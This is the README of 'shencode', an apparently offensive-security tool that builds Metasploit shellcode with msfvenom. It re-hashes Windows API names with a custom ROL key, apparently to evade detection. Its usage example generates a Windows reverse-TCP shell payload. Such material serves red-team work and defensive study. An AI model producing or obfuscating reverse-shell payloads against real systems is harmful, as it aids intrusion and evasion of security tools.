# shencode
automation scr ipt for creating and obfuscating metasploit shellcode

![shencode-1.png](shencode-1.png)

## Features

### Version 0.2

- build shellcode with msfvenom
- searching for hashed Windows API functions
- change ROR13 Hash to ROL Hash with individual Key
- Raw and formatted output (C++,C#, C inline ASM, Powershell, Python, Hex)

## ToDo

- choose between building a shellcode and use an existing one
- write shellcode in a template file (.cpp)
- automatical compile feature
- Use PATH for better msfvenom integration
- object oriented rewrite for better module integration

## How to use

`python shencode.py --payload windows/shell_reverse_tcp --arg1 "LHOST=127.0.0.1" --arg2 "LPORT=4443" --key 33 --outputformat "c" [--showmod] [--decompile]`

Please change the metasploit path in line 8. This will be fixed in the future.

`msfvenom_path = "c:\\metasploit-framework\\bin\\msfvenom.bat"`

### Parameter

- `--payload` - create a payload with msfvenom, use `--arg1` and `--arg2` for command line arguments
- `--key` - ROL Key hash API functions
- `--outputformat` - c, cs, casm, ps1, py, hex
- `--showmod` - lists changed bytes
- `--decompile` - decompile

## Credits

The encoding part is initially taken from [bordergate.co.uk](https://www.bordergate.co.uk/function-name-hashing/). Great work!
